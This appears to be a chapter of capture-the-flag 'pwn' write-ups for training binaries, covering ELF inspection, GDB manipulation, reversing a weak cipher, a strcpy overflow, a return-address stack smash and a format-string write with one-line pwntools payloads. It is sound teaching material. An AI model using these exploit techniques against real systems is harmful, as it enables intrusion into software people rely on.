\chapter{Pwn Writeups}

\section{Software Security 0}
\subsection{SS_0.01 - The safe}
Idea: password can be found in plaintext in \texttt{.rodata} section.

Run: \texttt{readelf -p .rodata the_safe}

\subsection{SS_0.02 - acrostic}
Literally: \texttt{objdump -d acrostic}

\subsection{SS_0.03 - dissection}
Idea: list all sections contained in the provided ELF file. The flag is encoded in sections name.

Run: \texttt{readelf -S dissection | grep CCI -A 17 | sed -n "p;n" | awk '{print $2}' | tr -d '\n'}

\subsection{SS_0.04 - volatility}
Idea: put a breakpoint at the beginning of one of the functions that receive the flag as argument, then print the first and only arg.

Run: \texttt{gdb --batch --command=scripts/volatility.gdb volatility}

\subsection{SS_0.05 - piecewise}
See: \textit{scripts/piecewise.py}

\section{Software Security 1}
\subsection{SS_1.01 - NextGen Safe}
Idea: the function that prints the flag is not called, however is packed into the binary (check with \texttt{readelf -p .strtab nextgen_safe}, or \texttt{info functions} inside GDB).
Sooo... just call it from GDB.

Run: \texttt{gdb --batch -x scripts/nextgen_safe.gdb nextgen_safe}

\subsection{SS_1.02 - Slow Printer}
Idea: open program in GDB and intercept every syscall to \texttt{clock_nanosleep}.
As soon as the system call is catched, set \texttt{RDX} register to \texttt{null}.
\texttt{RDX} register corresponds to \texttt{const struct timespec *t} parameter of \texttt{clock_nanosleep} function (ref. \href{https://man7.org/linux/man-pages/man2/clock_nanosleep.2.html}).

Run: \texttt{gdb --batch -x slow_printer.gdb slow_printer}

Alternatives:
\begin{itemize}
  \item skip \texttt{clock_nanosleep} calls patching the binary with NOPs (e.g., with Ghidra). See \textit{scripts/slow_printer_patched}
  \item DLL (\texttt{LD_PRELOAD}) injection
\end{itemize}

\subsection{SS_1.03 - Flag Checker}
Run code in GDB: \texttt{gdb flag_checker}.
Start it with a string as first arg: \texttt{start test}.
A SEGV will occur; backtracing it (\texttt{bt}) show an infinite recursive call.

Dissecting the binary (eg., in Ghidra) shows a function that computes the cumulative sum (stored in its third arg) of the first argument passed to the function (argv[1]).
Each character of the cumsum is tested against what presumably is each character of the flag's cumsum.
By reading the memory location where this array of integers is stored and reversing the cumsum the flag is disclosed.

See: \textit{scripts/flag_checker.py}

\subsection{SS_1.04 - Unbreakable AES}
By disassembling the code three internal functions are found \texttt{main}, \texttt{encrypt} and \texttt{ror}.

\texttt{main} function simply performs file handling operations (basically opening), as well as key validity checking (only alphanum chars).

If successful, \texttt{encrypt(<input-file>, <output-file>, <key>)} is invoked.
By carefully analyzing the disassembled code of this function, it turns out that key is not used.
The function performs right rotation of each character of the ciphertext (input file) a number of times equal to the character position plus one.

See: \textit{scripts/unbreakable_aes.py} is the script used to implement the decryption, making use of the inverse function of ror: rol -- ROtate Left.

\section{Software Security 2}
\subsection{SS_2.01 - Digital billboard}
The following snippet is the core of the challenge:
\begin{verbatim}
struct billboard {
    char text[256];
    char devmode;
};
struct billboard bb = { .text="Placeholder", .devmode=0 };

void set_text(int argc, char* argv[]) {
    strcpy(bb.text, argv[1]);
    printf("Successfully set text to: %s\n", bb.text);
    return;
}
\end{verbatim}

Using \texttt{strcpy} is inherently unsafe.
By maliciously manipulating the input string, \texttt{devmode} flag can be flipped.
The value of \texttt{text} is comnpletely under the user's input: \texttt{'a'*257} is enough to overflow the allocated buffer, thus turning \texttt{devmode} into \texttt{'a'}, which is 1 under boolean perspective.

\subsection{SS_2.02 - 1996}
Objective: change control flow to run the \texttt{spawn_shell} function.

\texttt{cin} function allows stack smashing, and PIE is disabled, making it impossible for the kernel to enable ASLR.
\texttt{spawn_shell} address can be found from the symbol table: \texttt{objdump -t 1996 | grep "spawn"}.
The address is 64-bits long, like \texttt{file 1996} confirms.

Reversing the binary allows us to understand the offset of the stored RIP in \texttt{main}'s stack: 1048 bytes from buffer's base address.
By filling the stack with 1048 bytes of padding and appeding the desired address (\textit{0000000000400897}) at the end of the payload, the challenge is solved.

See: \textit{scripts/1996.py}

\subsection{}
Objective: change the value of \texttt{the_answer} variable in \texttt{.data} section, replacing its content with the value 42.

From the application source code, call to \texttt{printf} with arbitrary user input can be noticed.
The user input is fed to the function as a first argument, thus enabling format strings interpretation.
A format string attack is therefore chosen.

Address of the variable is extracted from the symbol table: \texttt{objdump -t the_answer | grep answer}. \\
Result: \textit{0x0000000000601078}

Solution#1: \texttt{python3 -c 'import sys; from pwn import p32; sys.stdout.buffer.write(b"\%42c\%12\$ln".ljust(16, b"A") + p32(0x0000000000601078).ljust(8, b"\0") + b"\n")' | ./the_answer}
Solution#2: \texttt{python3 -c 'import sys; from pwn import p32; sys.stdout.buffer.write(b"AAAAAA\%36c\%12\$ln" + p32(0x0000000000601078).ljust(8, b"\0") + b"\n")'}

The attack consists in writing 42 bytes, then jumping to printf variadic stack that contains the target address, writing emitted bytes/chars (42) in that location with \texttt{\%12\$ln}.